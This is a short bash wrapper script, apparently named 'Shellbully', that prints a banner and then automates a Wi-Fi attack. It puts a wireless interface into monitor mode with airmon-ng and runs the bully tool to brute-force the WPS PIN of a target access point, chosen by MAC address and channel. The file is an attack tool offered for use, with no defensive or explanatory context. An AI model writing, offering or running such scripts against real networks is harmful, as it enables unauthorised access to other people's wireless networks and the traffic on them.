echo
clear
echo
echo "            \e[1;31m ███████╗██╗  ██╗███████╗██╗     ██╗     ██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗ \e[0m"
echo "            \e[1;31m ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝ \e[0m"
echo "            \e[1;31m ███████╗███████║█████╗  ██║     ██║     ██████╔╝██║   ██║██║     ██║   ╚████╔╝  \e[0m"
echo "            \e[1;31m      ██║██╔══██║██╔══╝  ██║     ██║     ██╔══██╗██║   ██║██║     ██║    ╚██╔╝   \e[0m"
echo "            \e[1;31m ███████║██║  ██║███████╗███████╗███████╗██████╔╝╚██████╔╝███████╗███████╗██║    \e[0m"
echo "            \e[1;31m ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝    \e[0m"
echo "                               \e[1;33m Shellcode by Rahat Khan Tusar(RKT)\e[0m"
echo "                                \e[1;33mGithub : https://github.com/r3k4t\e[0m"
echo                                                                              
read -p "Enter Interface wlp2s0,wlan0 etc : " interface
echo
echo "***********************************"
echo "\e[1;32mStarting Monitor Mode\e[0m"
echo "***********************************"
echo 
sudo airmon-ng start $interface
echo
echo "**********************"
echo "\e[1;32mBullyWPS\e[0m"
echo "**********************"
echo
read -p "Target Mac Address : " mac 
read -p "Enter Interface : " interface
read -p "Target Channel : " channel
echo
sudo bully $interface  -b $mac  -c $channel  -d
  



  


